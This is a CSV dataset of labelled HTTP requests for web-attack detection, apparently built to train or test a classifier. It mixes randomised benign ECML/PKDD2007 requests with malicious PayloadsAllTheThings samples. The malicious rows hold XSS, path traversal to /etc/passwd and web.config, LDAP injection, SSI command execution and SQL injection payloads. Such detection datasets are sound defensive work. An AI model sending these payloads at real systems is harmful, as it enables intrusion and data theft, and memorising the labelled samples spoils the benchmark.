attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
XSS,medium,,malicious,"POST /auth HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Connection: close

search=\152\141\166\141\163\143\162\151\160\164\072alert(1)&id=2283",,230,patt-xss-1283,PayloadsAllTheThings,\152\141\166\141\163\143\162\151\160\164\072alert(1)
,hard,-2.0,benign,"GET /oveasotnewye4Etsn/543opme23e4iguxca/zS1Z8esx-/nOpmN@5_fc-smamHWM.cfm?t4mcehtowoendh=0s&irN=cloge&3hotmf2eEbf4lih=791184&htohnyrma=119636776&M11t=rqpTZKs&kx=65766311&OflnIsdc0bs=1585nmcds&g1ry70nEcbh2l=2&qhludtn6vnF8a7=%3Fov&vhfuheaomhi=%24&ee=un&ytaV=twindow.opentels HTTP/1.0
Host: 160.215.103.242
Connection: keep-alive
Accept: application/*;q=0.1
Accept-Charset: *
Accept-Encoding: *
Accept-Language: Noerhht-gaVonrke;q=0.4, nAat-dhui;q=0.5
Cache-Control: enFdeds=f
Client-ip: 20.168.138.91
Cookie: fsmnzngrhrnh=stpenE~$a'?~0a4n
Cookie2: $Version=""60""
Date: Fri, 17 Jun 05 04:07:10 GMT
ETag: ""pPoR91CtLf54RYXcN""
Expect: 100-continue
From: e26srb@io4s2eeaid.gov
If-Modified-Since: Sun, 04 Apr 04 14:58:23 GMT
If-Unmodified-Since: Fri, 11 Aug 06 03:07:10 CET
If-Match: ""R87G4_IAN1RGNwD""
If-None-Match: ""1gl_QKzQQTF2Tb@HGG""
If-Range: *
Max-Forwards: 86
MIME-Version: 4.3
Pragma: qOoIc=dlm
Proxy-Authorization: Digest username=""udr5p1ia""
Authorization: NTLM RG9yaWVsQXI1YUEzbXFhMjJlZnRuZWludGVsb3Vib25mbXRicUtjcGduUmk=
Range: -31011,02795-
Referer: http://tdnGdlhz.de/gb7e/ilii.htm
TE: chunked,deflate;q=0.2
Trailer: Warning
User-Agent: Mozilla/4.8 (Machintosh; U; PPC 0.6; Ns-en; rv:0.1.9) Gecko/26441920
UA-CPU: 68000
UA-Disp: 210,7088,16
UA-OS: Windows NT
UA-Color: color8
UA-Pixels: 0946x4781
Via: HTTP/9.1 180.212.22.162, 4.5 240.18.143.252, 6.6 www.tlysdS.gif
Transfer-Encoding: deflate
Upgrade: rsesd/2.4, wei/5.5
Warning: 498 120.1.39.164 ""tiusLw"" 
X-Forwarded-For: 204.13.171.9
X-Serial-Number: 76488
----: ---------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~",32221,1637,xml_test-32221,ECML/PKDD2007,
,hard,-2.0,benign,"GET /V@3KiRVsn_lBxKS/escriptkAe/bcFSRuGcTajhGZHMATZ/updateK-kX/exe/eUGBAPobKQSJqYa8tdbm/dFO0ToGXD0GB4K7/Eyeirres3tjnc/sns8xd3r0durtimyin.exe?Utsht=r7l5yteIvetauhod&7oeoct9anewduk0=ra4impintoutAerheZ&ktatRirzoefb8o=790&ELjtreR=rpd%40nhotyewe&ne=of&gsm=yft5 HTTP/1.1
Host: www.Aatiehgms.ch
Connection: cpsmi5Ae
Accept: */*
Accept-Charset: *;q=0.4
Accept-Encoding: deflate;q=0.7, gzip;q=0.6, gzip;q=0.0
Accept-Language: memot-nhl;q=0.0, xmch-intE7, RaoC-i7;q=0.6, weio-seiaot
Cache-Control: no-transform
Client-ip: 77.98.59.51
Cookie: rxtMTag9ls=14681960;iOyia4a7A5n='hEses4af\e;pn5sgnpc8ia=05t7y8];PIimuizeshcknli=uhtsnfeahulseu;uorrAhafv27thn=m<i$g;sedeOjd=6
Cookie2: $Version=""088""
Date: Sun, 29 May 05 01:43:56 UTC
ETag: ""4ZoXdfDu0q2fc1O652""
Expect: 100-continue
From: ahlxburo@rectarusna.st
If-Modified-Since: Thu, 12 Jan 06 18:04:35 GMT
If-Unmodified-Since: Sun, 11 Feb 07 20:06:54 UTC
If-Match: ""9fFYXKE69h_WLrA""
If-None-Match: *
If-Range: *
Max-Forwards: 7
MIME-Version: 8.3
Pragma: t=gNp1ee
Proxy-Authorization: Basic aGtzc09lRTpuN2g4cw==
Authorization: NTLM bmVscTJzZWF1c3Jpb2Ruc3R3dGhlV3pFb2FhaWV0aWh0aWFtZXJldGV0czY=
Range: 7-27394,731-8,0552-
Referer: /7tji2/bfdT/ntAk.pdf
TE: gzip
Trailer: Upgrade
User-Agent: snnnnen/5.9.5.0.2
UA-CPU: 68000
UA-Disp: 7808,2249,8
UA-OS: Solaris
UA-Color: color8
UA-Pixels: 040x521
Via: d3n/3.4 91.182.174.245
Transfer-Encoding: identity
Upgrade: ews/8.3
Warning: 480 www.6ge64dis.htm ""TNisirlesy0eema"" 
X-Forwarded-For: 86.182.5.47
X-Serial-Number: 2418413
----: ------------------
~~~~~: ~~~~~~~~~~",21341,1585,xml_test-21341,ECML/PKDD2007,
,hard,-2.0,benign,"GET /yF-_eX/ng91nELLQS3/FsoandiEfq/nuese1Ussn/eg.5eF9U8/rD9L0Yk43oW7Awx/thUkM6xqiXCUa/temeeRtntdogA5devnoa.asp?o1r4mtdtet8s=le1sn6igwi&oEegaduYwwr=tolw45Dt7ra&8t=5rtie&yknL=9939605&edtb=139&swQGTKzK7=bin&Xihhsia=ru&lae=nnfr9wfoA9nd%5D HTTP/1.1
Host: 30.30.141.111
Connection: close
Accept: audio/x-wav, application/*
Accept-Charset: big5;q=0.5, iso-8859-15, iso-8859-3, euc-kr;q=0.7, gb2312;q=0.7
Accept-Encoding: *
Accept-Language: eE-tcf, icetnk-esyacl;q=0.5, l0psibr-drnCE4F, nis-mdnleesl, hdaemahs-rhl
Cache-Control: no-cache
Client-ip: 228.105.254.173
Cookie: WsyAFFnW=169;onicewa5o=xnh=gh;Tisroomnat7A=9301539
Cookie2: $Version=""7""
Date: Thu, 10 Nov 05 09:20:24 GMT
ETag: W/""0Hvg@u8X5QAlknvgh7rb""
Expect: 100-continue
From: o4oia@etet.cz
If-Modified-Since: Fri, 03 Apr 09 09:19:01 CET
If-Unmodified-Since: Mon, 05 Oct 09 10:06:27 GMT
If-Match: *
If-None-Match: *
If-Range: ""fcwd_CgMbeD0QuU""
Max-Forwards: 359
MIME-Version: 8.5
Pragma: se='nr'
Proxy-Authorization: 2cetnc heTr=rcamx1k
Authorization: Basic em10dGRMOml3bGllaHI=
Range: 46-,280-2255,32588-
Referer: /En4ln/sitcsic/hlei.nsf
TE: trailers
Trailer: Transfer-Encoding
User-Agent: Mozilla/8.3 (Windows; U; Windows NT 5.8; yn-ep; rv:0.0.6) Gecko/25991976
UA-CPU: MIPS
UA-Disp: 0119,2506,16
UA-OS: Windows NT
UA-Color: color16
UA-Pixels: 669x906
Via: 3.5 www.lbzsssn.html
Transfer-Encoding: compress
Upgrade: qrr/1.4, tcee/4.7, etrlFl/9.5, ehb/4.8
Warning: 482 www.seye8.css ""Ys4oert7ti"" 
X-Forwarded-For: 190.232.63.32
X-Serial-Number: 92423943597
----: -----------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",25008,1659,xml_test-25008,ECML/PKDD2007,
Path Traversal,medium,,malicious,"POST /comments HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Connection: close

q=..///..///..///..///..///..///boot.ini&id=2157",,206,patt-path-traversal-1157,PayloadsAllTheThings,..///..///..///..///..///..///boot.ini
,hard,-2.0,benign,"GET /UtOyoieEtacHoxr8/i0i08s9H_bvG_8/jnhpbrues7/script0aFC/MrwinntA__gC9X3openvPv/ohoDXI_YBnw/3nt19rtieni.mdb? HTTP/1.1
Host: www.ohNiyuo8.com:960
Connection: heuygak
Accept: text/html;q=0.2
Accept-Charset: us-ascii, x-mac-korean;q=0.0, x-mac-japanese
Accept-Encoding: *
Accept-Language: eoo-trecigm, Mussgf-uA2oo;q=0.1, dotr-n;q=0.4, s6t-Aee0qho;q=0.7, c8viien2-a1hheS
Cache-Control: no-transform
Client-ip: 200.137.77.135
Cookie: txtehtiiheNeh=bmas;l3wsienr=aseT ;n2bt6ecS6emj=e6uljsctal1c;UGlJR0Fy=passwd0;tot5h9c=743
Cookie2: $Version=""58""
Date: Sun, 30 Apr 06 05:44:11 CET
ETag: W/""DhKnl6k1X54a0HDS96hg""
Expect: 100-continue
From: t1Gpd0t@aonx3yb.biz
If-Modified-Since: Wed, 31 Oct 07 03:18:40 GMT
If-Unmodified-Since: Wed, 31 Aug 05 01:01:57 CET
If-Match: *
If-None-Match: ""g.g@@54zM63eWlvddEAg""
If-Range: Tue, 21 Mar 06 04:51:11 CET
Max-Forwards: 85
MIME-Version: 7.7
Pragma: l='saiO'
Proxy-Authorization: Digest nc=69Fc9563
Authorization: Basic OElpYXQ3OmZhZXU=
Range: -2,-697987
Referer: /erin/eaHxescr/eaicn.dll
TE: trailers,gzip
Trailer: If-Range
User-Agent: ctlx6ATeAd
UA-CPU: x86
UA-Disp: 878,5357,32
UA-OS: Win9x
UA-Color: color16
UA-Pixels: 0542x2765
Via: FTP/5.2 www.u5endtoo.htm:84407, 2.3 www.w1sOre.html
Transfer-Encoding: compress
Upgrade: rle/0.9, 32noar/1.9, terase/3.6, lop/4.7, lgd/8.7
Warning: 906 www.0bBaahO.html ""iyyOei"" ""Thu, 02 Feb 06 10:40:07 UTC""
X-Forwarded-For: 125.112.206.65
X-Serial-Number: 42015
----: ------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",21580,1577,xml_test-21580,ECML/PKDD2007,
LDAP Injection,medium,,malicious,"POST /search HTTP/1.1
Host: intranet.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: close

file=(&(sn=administrator)(password=MY*)) : OK&id=1090",,213,patt-ldap-injection-0090,PayloadsAllTheThings,(&(sn=administrator)(password=MY*)) : OK
Path Traversal,medium,4.0,malicious,"PUT /hdan1neiPsm/os/Me0rioniuwhc.png? HTTP/1.0
Content-Length: 313
Content-Language: ekiu,o
Content-Encoding: gzip
Content-Location: http://kndq.biz/ob8s/84inw/3hmn.swf
Content-MD5: cWhHY3R5aWRlbW9iYzRlcg==
Content-Type: application/x-www-form-urlencoded
Expires: Wed, 29 Sep 04 20:14:25 GMT
Last-Modified: Wed, 07 May 08 15:41:40 CET
Host: www.u25coa.biz
Connection: keep-alive
Accept: video/*
Accept-Charset: *
Accept-Encoding: deflate
Accept-Language: f-os;q=0.1, SSeh-Ov;q=0.7
Cache-Control: p5=nt6a
Client-ip: 76.203.238.234
Cookie: eL8boot.inin=3;Dale= aobjectrr;raueiews5uglu=mrwch;sryteita=iuorchem5
Cookie2: $Version=""0""
Date: Fri, 13 Aug 04 24:00:21 CET
ETag: ""tOSrx8eJa@kprlW9""
Expect: 100-continue
If-Modified-Since: Fri, 04 Jul 08 14:30:15 CET
If-Unmodified-Since: Tue, 20 Jul 04 05:38:07 GMT
If-Match: ""tn84.XWBII__-9w@i574""
If-None-Match: ""xKe7vNp18q9iB1QsC2j""
If-Range: Tue, 16 Mar 04 19:50:21 UTC
Max-Forwards: 3
MIME-Version: 8.8
Pragma: nir=y3reici
Proxy-Authorization: Basic c2V1cnRtcjpkZTF1
Authorization: NTLM dW41NXJjaVRlcmVpVGNidGhhN25FcHNsbnRvaWh3aWluZGV6M3NvZQ==
Range: 53-,6570-433377,-5771
Referer: /yde0cnwd/fpininc.tar.gz
TE: trailers,gzip;q=0.4
Trailer: User-Agent
User-Agent: mnseluhaTU (a2zCge; fIkbeju; lUB9oqDU; q2j8Ryic)
UA-CPU: Sparc
UA-Disp: 9353,7001,16
UA-Pixels: 441x030
Via: 4.2 80.132.73.161:03802, FTP/5.3 169.59.183.25
Transfer-Encoding: gzip
Warning: 033 102.101.187.47 ""senpv3nMsOiNryeagcPt"" 
X-Forwarded-For: 42.158.87.228
----: ---------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-_Ngroup by@V4J@=997&glqseodaldf17=6905&HBG4W7cOdocumentVFT=3607&etxnwr4=iMqLTFlU&nsbbhtdgsyfnuk=yhaSjfin>&jsce=/../../../Inetpub/iissamples/ilstme/liaralro/meitseal/taor.dll&cOo3k=ssbK (:|zmetwpleo~gc&uihree=e eiA&saumib=838618&e2ro0T=E67&Ndtmp9hLformyL1U-=r-JqPfkmtQi&hiLdUahh=154627",45364,1903,xml_test-45364,ECML/PKDD2007,
LDAP Injection,medium,,malicious,"GET /view?search=query = (&(uid=admin)(!(&(1=0)(userPassword=q)))) HTTP/1.1
Host: demo.local
User-Agent: curl/8.0.1
Accept: */*
Connection: close",,149,patt-ldap-injection-0045,PayloadsAllTheThings,query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
Path Traversal,medium,,malicious,"GET /login?path=/\../\../\../\../\../\../\../\../boot.ini HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Accept: */*
Connection: close",,149,patt-path-traversal-1080,PayloadsAllTheThings,/\../\../\../\../\../\../\../\../boot.ini
SQLi,medium,3.0,malicious,"POST /utb/tO/pGKCk.Uw/5gWP/lO7mKK.jqrdWuEAu/sy7eTraExutSsaoeatse/sletaal.css? HTTP/1.1
Content-Length: 145
Content-Language: 6tqrM8xm,txvs7ria,ttslnyz
Content-Encoding: gzip
Content-Location: /fLhis/ntign8en.exe
Content-MD5: ZGV2dHRTZXVlU25lc2hiaQ==
Content-Type: application/x-www-form-urlencoded
Expires: Wed, 08 Dec 04 15:41:38 CET
Last-Modified: Thu, 10 Dec 09 15:52:40 CET
Host: 241.47.175.100
Connection: keep-alive
Accept: image/png;q=0.6
Accept-Charset: x-mac-korean;q=0.0, x-mac-japanese;q=0.4, windows-1252;q=0.9, iso-8859-4;q=0.5, euc-cn
Accept-Encoding: *
Accept-Language: ';   shutdown--
Cache-Control: only-if-cached
Client-ip: 58.18.176.200
Cookie: ye=nus;ts5aedjlteObt=2Ugk;Arhthegwtehh=fncee;iler2ilnEa=rntry@hy~binhthn1wgs;gJ1euXeH7iwinnt=<is3
Cookie2: $Version=""80""
Date: Wed, 05 Jul 06 15:52:17 CET
ETag: ""NbMe7oZgcJBmRk8""
Expect: 100-continue
From: 6ueuo@oyblbl9dec.biz
If-Modified-Since: Thu, 10 Jul 08 03:39:51 UTC
If-Unmodified-Since: Wed, 06 Jan 10 18:21:13 UTC
If-Match: ""18xD6p2WGyDJSCPX""
If-None-Match: ""CgHj.-oAvd03O.luiTT""
Max-Forwards: 6974
Proxy-Authorization: Digest nc=53EA578F
Authorization: Basic ZTdlaGM6ZXN1Zw==
Range: 05899-13921,10727-12714,2996-
Referer: /nnea/tvrt2eer.bin
TE: deflate;q=0.5,chunked;q=0.2,trailers
User-Agent: Mozilla/6.7 (X11; U; Open BSD i586 9.9; 6t-nr; rv:4.8.8) Gecko/64294655
UA-OS: Win98
UA-Color: color32
Via: 3.2 www.rcfoa.html
Transfer-Encoding: identity
Warning: 061 www.szapau.png ""yf3tew"" 
X-Forwarded-For: 61.170.12.182

yeeEhhtmra=S zn%ei&ulr=1860518&iotEeoirM=e2CWqnN&perhew0oigo=254781&neoEoeaertfdfi=valllu&3he=S6+allog6itnph-&WH3EUx3d=987&aPr5cNemorpc2a=137",42731,1675,xml_test-42731,ECML/PKDD2007,
Path Traversal,medium,,malicious,"POST /download HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Connection: close

comment=/..\/..\/..\/..\/..\/..\/..\/..\/etc/passwd&id=2196",,226,patt-path-traversal-1196,PayloadsAllTheThings,/..\/..\/..\/..\/..\/..\/..\/..\/etc/passwd
,hard,-2.0,benign,"PUT /nttwsiuhyew/h4c/5J1B_K9fG2ldUPGRid/oITCY@FW3gHfSb/jhttpMvD-Txp_0h/O8like1PwXBuT4.e/hfTtearliyswtncw.dll? HTTP/1.1
Content-Length: 171
Content-Language: e,nRu
Content-Encoding: gzip
Content-Location: /mawitm/u3syUIeo/geeiFhd.zip
Content-MD5: YmQ5ZWVuZTducm50dHV0bg==
Content-Type: application/x-www-form-urlencoded
Expires: Wed, 14 Apr 10 12:28:23 GMT
Last-Modified: Sun, 15 Aug 04 03:53:57 GMT
Host: www.hhyte4.be
Connection: IanZc
Accept: */*
Accept-Charset: cp-950;q=0.7, koi8-r;q=0.4, isiri-3342, windows-1255;q=0.4
Accept-Encoding: gzip;q=0.0
Accept-Language: *
Cache-Control: no-store
Client-ip: 17.231.141.238
Cookie: 1v9he1wpr5i=xt1Rveyrst;HeaoNEnis=406;YUm_=nH6arsaesbadon;e66meznw=innia9w
Cookie2: $Version=""35""
Date: Mon, 11 Jan 10 22:18:14 CET
ETag: W/""vj8wTgBR@25qmjKFMti""
Expect: hou2r
From: fhleens@leny2Irsni.it
If-Modified-Since: Thu, 28 Jul 05 17:42:31 GMT
If-Unmodified-Since: Thu, 09 Oct 08 14:48:15 UTC
If-Match: *
If-None-Match: *
If-Range: *
Max-Forwards: 80
MIME-Version: 2.7
Pragma: no-cache
Proxy-Authorization: NTLM c1BoWW1uMmxyZWx0Y2lvYXJvZWhJeHBqMGNpZ2U2ZmFvc2VMYndo
Authorization: NTLM N3NhM0RyYW5lNDNpbW0xcmN0aGRUbzhwcnRvc28wYXQwbjI=
Range: 659776-,87434-,7-715
Referer: http://www.Tjevmdkb.com/vhki5/owNveI8/ne1N/ilazess.swf
TE: trailers,deflate;q=0.5
Trailer: Pragma
User-Agent: Mozilla/2.5 (Windows; U; Win98 0.5; aH-nh; rv:5.7.9) Gecko/18762707
UA-CPU: x86
UA-Disp: 088,074,32
UA-OS: Windows NT
UA-Color: color16
UA-Pixels: 8624x050
Via: arS/3.8 47.245.83.192
Transfer-Encoding: gzip
Upgrade: 2o8/7.5, tlkaU/8.1, cSo5ei/1.7, nnttqr/9.4
Warning: 551 21.162.127.115 ""nsjirfogneooziabr"" ""Thu, 08 Jan 04 20:08:26 UTC""
X-Forwarded-For: 220.33.220.61
X-Serial-Number: 09187614917730
----: -----------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~

oi=16&nAacAnaejb=iwrt&pnB2=s~w>[yotDhi&1iIMpasswd=5612&ZvmVrw5oeheer=irbdjf0&heyPinon=520&eeikxghLzf5=72633372&OSYHXNWd7EV=1san&tymq2anerilSeva=1&24HFPoSND=158941719",33265,2002,xml_test-33265,ECML/PKDD2007,
,hard,-2.0,benign,"GET /rOdansouo/r8Xc_83BIXa-VL-M/4n1GYasnFneBtnhyoo/eG_vwI04OXgtpOkswMSC/HHnservicesHZW7/z4qCdT3h2f7.zq3/eItsdno44ledr/z8NVIfARxujh93Mk1Gy.exe?ejiotfEvan=oe%3Bne%40eE&4NZdocumentoQLur=44445&fAkgtriwiouneen=bsEiorS8aa&toh8aaiaseh=eRO1RtBfk&h6ite8cp=00 HTTP/1.0
Host: 135.240.20.107
Connection: keep-alive
Accept: video/mpeg, image/jpeg;q=0.4, image/gif;q=0.9
Accept-Charset: *
Accept-Encoding: *
Accept-Language: *;q=0.9
Cache-Control: ut8f=d
Client-ip: 247.231.82.2
Cookie: EritmtogutloIn=ruah>39ixRapasswdn[e;ieUrfnahe=862001;rntea=vthSy eia
Cookie2: $Version=""81""
Date: Sun, 21 Sep 08 14:05:53 GMT
ETag: ""x-0vskwvvt.CtBrpiL@m""
Expect: btNrwRS=esgoei
From: imIs@osaeiaEd.de
If-Modified-Since: Thu, 10 Mar 05 03:35:19 UTC
If-Unmodified-Since: Fri, 04 Apr 08 13:12:54 CET
If-Match: ""jL@PWaxxre90_4.""
If-None-Match: ""lZWOTtZJWnD4NFR""
If-Range: Sun, 24 Sep 06 15:39:33 GMT
Max-Forwards: 60
MIME-Version: 1.6
Pragma: Ygay3oc='o4gjk'
Proxy-Authorization: Basic ZWRpdWVxaWE6Nmxvb2k=
Authorization: 1Syx tlzemurc=e3ryosi
Range: 27626-91
Referer: /nt2aohnr/oier8i6/menmtbt.php3
TE: gzip;q=0.2
Trailer: Via
User-Agent: s5Zuwy http://www.fs6hs.gov
UA-CPU: 68000
UA-Disp: 8051,5811,8
UA-OS: Windows 95
UA-Color: color32
UA-Pixels: 8509x9996
Via: 5.2 www.iaeS0UGk.tiff
Transfer-Encoding: compress
Upgrade: odk/7.0
Warning: 961 www.ntijm.html ""estseteardr"" ""Thu, 20 Mar 08 23:35:03 CET""
X-Forwarded-For: 53.255.102.214
X-Serial-Number: 3858691762
----: ------------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",8475,1586,xml_test-8475,ECML/PKDD2007,
SSI,medium,,malicious,"GET /view?file=<!--#exec cmd=""whoami"" --> HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Accept: */*
Connection: close",,133,patt-ssi-0552,PayloadsAllTheThings,"<!--#exec cmd=""whoami"" -->"
XSS,medium,,malicious,"GET /view?comment=""`'><script>\x7Ejavascript:alert(1)</script> HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Accept: */*
Connection: close",,155,patt-xss-1238,PayloadsAllTheThings,"""`'><script>\x7Ejavascript:alert(1)</script>"
XSS,medium,,malicious,"POST /api/items HTTP/1.1
Host: app.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Connection: close

redirect=""'><img src=xxx:x onerror\x0D=javascript:alert(1)>&id=2274",,225,patt-xss-1274,PayloadsAllTheThings,"""'><img src=xxx:x onerror\x0D=javascript:alert(1)>"
SSI,medium,,malicious,"POST /view HTTP/1.1
Host: app.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: close

name=<!--#include file=""..\..\web.config"" -->&id=1569",,206,patt-ssi-0569,PayloadsAllTheThings,"<!--#include file=""..\..\web.config"" -->"
,hard,-2.0,benign,"GET /j3fo-phph59iH/puNHfDhy1qKUd/e24CUBnjPzg1lbCg5Ck.tiff?6is=ieiipeoctinpassthru HTTP/1.0
Host: www.ewe5s.biz:80
Connection: nftrn
Accept: application/*;q=0.4, application/x-tar;q=0.7
Accept-Charset: *
Accept-Encoding: 
Accept-Language: 8oisa-d;q=0.4, aoflrett-7hon;q=0.8, inpt-byaysf9;q=0.8, theouet-pTnltheu, 08-2Dva;q=0.0
Cache-Control: max-age=55
Client-ip: 126.23.16.226
Cookie: hsr=2650680;acmstyle6XLDTo=88800762
Cookie2: $Version=""5""
Date: Sun, 19 Nov 06 06:13:23 UTC
ETag: ""V1brjk9uOr@kji@""
Expect: 100-continue
From: pnlav3j@ifnra.biz
If-Modified-Since: Wed, 03 Mar 10 15:43:18 CET
If-Unmodified-Since: Fri, 01 Apr 05 24:24:17 GMT
If-Match: ""hTYW.O9owwoQPbK9XZ5K""
If-None-Match: *
If-Range: ""Yq@OpGA@8LbQj7_nu5""
Max-Forwards: 47
MIME-Version: 8.5
Pragma: eu1='Zn'
Proxy-Authorization: NTLM c2huT3NveW4xN2lnNm5yeW9qbDR0ZmV1QUhvcmxhZXR0b21hZA==
Authorization: Basic cmV5TmE6b2VFbzQ=
Range: 432781-
Referer: http://www.1tse.it/tpoim8h/itTuic.mpg
TE: chunked;q=0.8,trailers,trailers
Trailer: Connection
User-Agent: Mozilla/8.2 (X11; U; Linux i386 3.2; sl-c2; rv:3.4.5) Gecko/35100078
UA-CPU: MIPS
UA-Disp: 166,4722,8
UA-OS: Win98
UA-Color: color16
UA-Pixels: 4261x691
Via: 7.5 197.122.92.140, 9.9 238.196.201.228
Transfer-Encoding: identity
Upgrade: re9sa/3.4
Warning: 810 www.cq0i.htm ""twdSte9atJriluetrna"" 
X-Forwarded-For: 184.51.223.21
X-Serial-Number: 00220093101680020421
----: -------------------------------
~~~~~: ~~~~~~~~~~~~",28107,1484,xml_test-28107,ECML/PKDD2007,
SQLi,medium,3.0,malicious,"POST /aig/2zrgDqjPcelor/5ar/rimh/VytqwselectN/lQd2DAum5am/IHgO2etcilinkexecNOx0I/t7nctedlhaiTIod/biescybyseeliaM/nyeHoa.cfm? HTTP/1.0
Content-Length: 179
Content-Language: yrs,e2a,mtjner
Content-Encoding: compress
Content-Location: /utlec/ecisja2/sibjd/cSxTe/eoamr.wmn
Content-MD5: b1RlZW51d2R5cWdnOXlobQ==
Content-Type: application/x-www-form-urlencoded
Expires: Mon, 08 Feb 10 12:44:36 UTC
Last-Modified: Fri, 06 May 05 01:31:45 UTC
Host: 147.16.234.27
Connection: close
Accept: text/xml;q=0.3
Accept-Charset: *;q=0.6
Accept-Encoding: gzip, deflate
Accept-Language: 7me-gh7soaas;q=0.9, jovcem-4e, hirdr-as, eet5v8c-ata0eo0n;q=0.3, a-eards;q=0.8
Cache-Control: no-store
Client-ip: 196.36.129.201
Cookie: u4AeaWlt=3aiadnaof;Anfc8SsToem=tkehuro;Nme9dhtOnrrl8nJ=:d6hnc zbvtdtdw;1rnusghmYnaTi=6180808;8Qp9RUfIUbetweenf=in;C1r5zand79mtb=+techo
Cookie2: $Version=""458""
Date: Mon, 03 Nov 08 03:09:19 UTC
ETag: W/""4aBq-mQ1_DiT7vYxf""
Expect: enoavte1=egee
From: hbituu@nl5IshaU.be
If-Modified-Since: Sat, 25 Sep 04 10:48:35 UTC
If-Unmodified-Since: Thu, 30 Sep 04 01:13:41 UTC
If-Match: ""5IybfPEmxv5zbuKfR71V""
If-None-Match: ""Ymizpe0zlydu2WdGsD""
If-Range: *
Max-Forwards: 5
MIME-Version: 0.4
Pragma: rfnj9='q'
Proxy-Authorization: Digest qop=ymsaBhdy
Authorization: Digest response=""81F678b71Cec7e540dBdF0573EaC9FC0""
Range: -86
Referer: /c7nnswjt/n04ebete/Bct9nuee/diSme.php
TE: trailers
Trailer: Date
User-Agent: Mozilla/4.6 (X11; U; Unix 8.8; tl-d2; rv:5.5.5) Gecko/51578696
UA-CPU: MIPS
UA-Disp: 0773,9723,16
UA-OS: Linux
UA-Color: color8
UA-Pixels: 738x118
Via: gen/6.5 145.215.31.105
Transfer-Encoding: deflate
Upgrade: rht/5.4
Warning: 594 www.eduo.css ""iv5whwy"" ""Sun, 10 Aug 08 19:07:44 UTC""
X-Forwarded-For: 47.63.17.194
X-Serial-Number: 9168693821015244526
----: -----------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~

eu8haoarwnssrmr=OR  'shr'     IN (    '    '  )&0L.arnq-=fco3&oagohdiaorcoSte=t50ZAeim&UPcatqNZsVupdatedEV=pmspe(Alaittwindow.open&eierylthtwmhmm=omiotelnet&6m7gl=61",41428,2053,xml_test-41428,ECML/PKDD2007,
